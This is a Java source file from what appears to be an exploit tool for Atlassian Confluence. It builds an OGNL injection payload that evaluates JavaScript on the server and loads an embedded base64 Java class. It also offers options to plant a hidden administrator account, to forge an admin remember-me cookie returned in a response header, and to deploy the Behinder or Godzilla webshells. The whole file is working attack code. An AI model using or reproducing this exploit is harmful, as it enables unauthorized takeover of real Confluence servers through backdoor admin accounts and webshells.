package com.qax.confluence.exp;

import java.net.URLEncoder;

public class Util {
    public static String getEvalCode(String jsCode){
        return String.format("\\u0027%%2b#{\\u0022\\u0022[\\u0022class\\u0022].forName(\\u0022javax.script.ScriptEngineManager\\u0022).newInstance().getEngineByName(\\u0022js\\u0022).eval(\\u0022var+header%%3dcom.atlassian.core.filters.ServletContextThreadLocal.getResponse().setHeader(\\u0027X-Options\\u0027,\\u0027Success\\u0027)%%3b%s\\u0022)}%%2b\\u0027", jsCode);
    }

    public static String getEvalJsCode(String code, String className){
        code = URLEncoder.encode(code);
        return String.format("var+classBytes+%%3d+java.util.Base64.getDecoder().decode(\\u0027%s\\u0027)%%3b\n" +
                "var+loader+%%3d+java.lang.Thread.currentThread().getContextClassLoader()%%3b\n" +
                "var+reflectUtilsClass+%%3d+java.lang.Class.forName(\\u0027org.springframework.cglib.core.ReflectUtils\\u0027,true,loader)%%3b\n" +
                "var+urls+%%3d+java.lang.reflect.Array.newInstance(java.lang.Class.forName(\\u0027java.net.URL\\u0027),0)%%3b\n" +
                "var+params+%%3d+java.lang.reflect.Array.newInstance(java.lang.Class.forName(\\u0027java.lang.Class\\u0027),3)%%3b\n" +
                "params[0]+%%3d+java.lang.Class.forName(\\u0027java.lang.String\\u0027)%%3b\n" +
                "params[1]+%%3d+java.lang.Class.forName(\\u0027[B\\u0027)%%3b\n" +
                "params[2]+%%3d+java.lang.Class.forName(\\u0027java.lang.ClassLoader\\u0027)%%3b\n" +
                "var+defineClassMethod+%%3d+reflectUtilsClass.getMethod(\\u0027defineClass\\u0027,params)%%3b\n" +
                "params+%%3d++java.lang.reflect.Array.newInstance(java.lang.Class.forName(\\u0027java.lang.Object\\u0027),3)%%3b\n" +
                "params[0]+%%3d+\\u0027%s\\u0027%%3b\n" +
                "params[1]+%%3d+classBytes%%3b\n" +
                "params[2]+%%3d+loader%%3b\n" +
                "defineClassMethod.invoke(null,params).newInstance()%%3b", code, className);
    }

    public static String getMyCustomCode(String payload){
        if (payload.equalsIgnoreCase("behinder")){
            return "";
        } else if (payload.equalsIgnoreCase("godzilla")) {
            return "";
        } else if (payload.equalsIgnoreCase("addAdmin") ||payload.equalsIgnoreCase("getCookie") ) {
            return "yv66vgAAADQAagoADQA1BwA2CgACADUIADcKADgAOQcAOggAOwcAPAgAPQoAAgA+CwAIAD8IAEAHAEELAAYAQgsAQwBECwBDAEUKABgARgoARwBICABJBwBKCABLCABMCABNBwBOCABPCABQCwAUAFELABQAUggAUwcAVAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAwTGNvbS9hdGxhc3NpYW4vY29uZmx1ZW5jZS91dGlsL21hdXRpbC9NYU1hbmFnZXI7AQAJZ2V0Q29va2llAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAR2YXIyAQBJTGNvbS9hdGxhc3NpYW4vc2VyYXBoL3NlcnZpY2UvcmVtZW1iZXJtZS9EZWZhdWx0UmVtZW1iZXJNZVRva2VuR2VuZXJhdG9yOwEABHZhcjMBAD1MY29tL2F0bGFzc2lhbi9zZXJhcGgvc3BpL3JlbWVtYmVybWUvUmVtZW1iZXJNZUNvbmZpZ3VyYXRpb247AQAEdmFyNAEAOExjb20vYXRsYXNzaWFuL3NlcmFwaC9zcGkvcmVtZW1iZXJtZS9SZW1lbWJlck1lVG9rZW5EYW87AQAEdmFyNQEAOUxjb20vYXRsYXNzaWFuL3NlcmFwaC9zZXJ2aWNlL3JlbWVtYmVybWUvUmVtZW1iZXJNZVRva2VuOwEACGFkZEFkbWluAQAsTGNvbS9hdGxhc3NpYW4vY29uZmx1ZW5jZS91c2VyL1VzZXJBY2Nlc3NvcjsBABlMY29tL2F0bGFzc2lhbi91c2VyL1VzZXI7AQAKU291cmNlRmlsZQEADk1hTWFuYWdlci5qYXZhDAAfACABAEdjb20vYXRsYXNzaWFuL3NlcmFwaC9zZXJ2aWNlL3JlbWVtYmVybWUvRGVmYXVsdFJlbWVtYmVyTWVUb2tlbkdlbmVyYXRvcgEAEHJlbWVtYmVyTWVDb25maWcHAFUMAFYAVwEAO2NvbS9hdGxhc3NpYW4vc2VyYXBoL3NwaS9yZW1lbWJlcm1lL1JlbWVtYmVyTWVDb25maWd1cmF0aW9uAQAScmVtZW1iZXJNZVRva2VuRGFvAQA2Y29tL2F0bGFzc2lhbi9zZXJhcGgvc3BpL3JlbWVtYmVybWUvUmVtZW1iZXJNZVRva2VuRGFvAQAFYWRtaW4MAFgAWQwAWgBbAQAFJXM6JXMBABBqYXZhL2xhbmcvT2JqZWN0DABcACcHAF0MAF4AXwwAYAAnDABhAGIHAGMMAGQAZQEADHVzZXJBY2Nlc3NvcgEAKmNvbS9hdGxhc3NpYW4vY29uZmx1ZW5jZS91c2VyL1VzZXJBY2Nlc3NvcgEABWFkbmltAQANYWRtaW5AcWF4LmNvbQEADWxpdWJvQDEyNi5jb20BABBqYXZhL2xhbmcvU3RyaW5nAQAZY29uZmx1ZW5jZS1hZG1pbmlzdHJhdG9ycwEAEGNvbmZsdWVuY2UtdXNlcnMMAGYAZwwAaABpAQAFcWF4bmIBAC5jb20vYXRsYXNzaWFuL2NvbmZsdWVuY2UvdXRpbC9tYXV0aWwvTWFNYW5hZ2VyAQAvY29tL2F0bGFzc2lhbi9zcHJpbmcvY29udGFpbmVyL0NvbnRhaW5lck1hbmFnZXIBAAxnZXRDb21wb25lbnQBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvT2JqZWN0OwEADWdlbmVyYXRlVG9rZW4BAE0oTGphdmEvbGFuZy9TdHJpbmc7KUxjb20vYXRsYXNzaWFuL3NlcmFwaC9zZXJ2aWNlL3JlbWVtYmVybWUvUmVtZW1iZXJNZVRva2VuOwEABHNhdmUBAHQoTGNvbS9hdGxhc3NpYW4vc2VyYXBoL3NlcnZpY2UvcmVtZW1iZXJtZS9SZW1lbWJlck1lVG9rZW47KUxjb20vYXRsYXNzaWFuL3NlcmFwaC9zZXJ2aWNlL3JlbWVtYmVybWUvUmVtZW1iZXJNZVRva2VuOwEADWdldENvb2tpZU5hbWUBADdjb20vYXRsYXNzaWFuL3NlcmFwaC9zZXJ2aWNlL3JlbWVtYmVybWUvUmVtZW1iZXJNZVRva2VuAQAFZ2V0SWQBABIoKUxqYXZhL2xhbmcvTG9uZzsBAA9nZXRSYW5kb21TdHJpbmcBAAZmb3JtYXQBADkoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL1N0cmluZzsBABNqYXZhL25ldC9VUkxFbmNvZGVyAQAGZW5jb2RlAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAAdhZGRVc2VyAQB2KExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL1N0cmluZzspTGNvbS9hdGxhc3NpYW4vdXNlci9Vc2VyOwEACHNhdmVVc2VyAQAcKExjb20vYXRsYXNzaWFuL3VzZXIvVXNlcjspVgAhAB4ADQAAAAAAAwABAB8AIAABACEAAAAvAAEAAQAAAAUqtwABsQAAAAIAIgAAAAYAAQAAAAwAIwAAAAwAAQAAAAUAJAAlAAAACQAmACcAAQAhAAAAuQAJAAQAAABduwACWbcAA0sSBLgABcAABkwSB7gABcAACE0qEgm2AApOLC25AAsCAE4SDAW9AA1ZAyu5AA4BAFNZBBIMBb0ADVkDLbkADwEAU1kELbkAEAEAU7gAEbgAElO4ABGwAAAAAgAiAAAAGgAGAAAADgAIAA8AEQAQABoAEQAhABIAKQATACMAAAAqAAQACABVACgAKQAAABEATAAqACsAAQAaAEMALAAtAAIAIQA8AC4ALwADAAkAMAAnAAEAIQAAAHAACQACAAAAMBITuAAFwAAUSyoSFRIWEhcSFQW9ABhZAxIZU1kEEhpTuQAbBgBMKiu5ABwCABIdsAAAAAIAIgAAABIABAAAABcACQAYACYAGQAtABoAIwAAABYAAgAJACcALAAxAAAAJgAKAC4AMgABAAEAMwAAAAIANA==";
        }
        return "";
    }

    public static String getMyCustomClassname(String payload){
        if (payload.equalsIgnoreCase("behinder")){
            return "org.apache.sodyt.HttpClientUtil";
        } else if (payload.equalsIgnoreCase("godzilla")) {
            return "org.apache.commons.qfzvlo.SerializationUtil";
        } else if (payload.equalsIgnoreCase("addAdmin") ||payload.equalsIgnoreCase("getCookie") ) {
            return "com.atlassian.confluence.util.mautil.MaManager";
        }
        return "";
    }

    public static String getCookieCode(){
        String jsCode = "var make = java.lang.Class.forName(\\u0027com.atlassian.confluence.util.mautil.MaManager\\u0027);\n" +
                "var method = make.getMethod(\\u0027getCookie\\u0027);\n" +
                "method.setAccessible(true);\n" +
                "var ss = method.invoke(null);\n" +
                "var a = com.opensymphony.webwork.ServletActionContext.getResponse();\n" +
                "a.setHeader(\\u0027Set_Admin_Cookie\\u0027,ss)";
        return getEvalCode(jsCode);
    }


    public static String addAdmin(){
        String jsCode = "var make = java.lang.Class.forName(\\u0027com.atlassian.confluence.util.mautil.MaManager\\u0027);\n" +
                "var method = make.getMethod(\\u0027addAdmin\\u0027);\n" +
                "method.setAccessible(true);\n" +
                "var ss = method.invoke(null);\n" +
                "var a = com.opensymphony.webwork.ServletActionContext.getResponse();\n" +
                "a.setHeader(\\u0027Set_Admin\\u0027,\\u0027Success\\u0027)";
        return getEvalCode(jsCode);
    }

    public static String getEvalCode(String code, String className){
        String evalJsCode = getEvalJsCode(code, className);
        return getEvalCode(evalJsCode);
    }
}
